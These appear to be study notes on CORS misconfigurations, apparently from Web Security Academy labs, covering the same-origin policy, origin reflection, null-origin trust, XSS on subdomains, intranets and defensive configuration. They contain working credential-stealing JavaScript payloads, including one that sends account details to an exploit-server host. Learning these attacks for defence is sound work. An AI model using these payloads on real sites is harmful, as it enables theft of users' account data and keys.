- Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).
#### Same-origin policy
- The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses
#### Relaxation of the same-origin policy
- The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
- The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
Server-generated ACAO header from client-specified Origin header
```
-    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'https://0a5b00a004153acc8003f3c5001a00e8.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + encodeURIComponent(this.responseText);
    };
</script>
```
#### Errors parsing Origin headers
- Some applications that support access from multiple origins do so by using a whitelist of allowed origins
- Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains
- The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
  - Cross-origin redirects.
  - Requests from serialized data.
  - Request using the `file:` protocol.
  - Sandboxed cross-origin requests.
Accepting null origin
```
- <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('GET', 'https://<your-lab-id>.web-security-academy.net/accountDetails', true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
      location = '/log?key=' + encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
##### Exploiting XSS via CORS trust relationships
- `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
##### Breaking TLS with poorly configured CORS
- website has subdomain "stock" using http that has XSS
- `<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>`
##### Intranets and CORS without credentials
- Most CORS attacks rely on the presence of the response header
  - `Access-Control-Allow-Credentials: true`
  - However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows
    - `GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com`
- And the server responds with
  - `HTTP/1.1 200 OK Access-Control-Allow-Origin: *`
Defense
- CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem.
- If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header.
- It may seem obvious but origins specified in the `Access-Control-Allow-Origin` header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.
- Avoid using the header `Access-Control-Allow-Origin: null`. Cross-origin resource calls from internal documents and sandboxed requests can specify the `null` origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.
- Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.
- CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.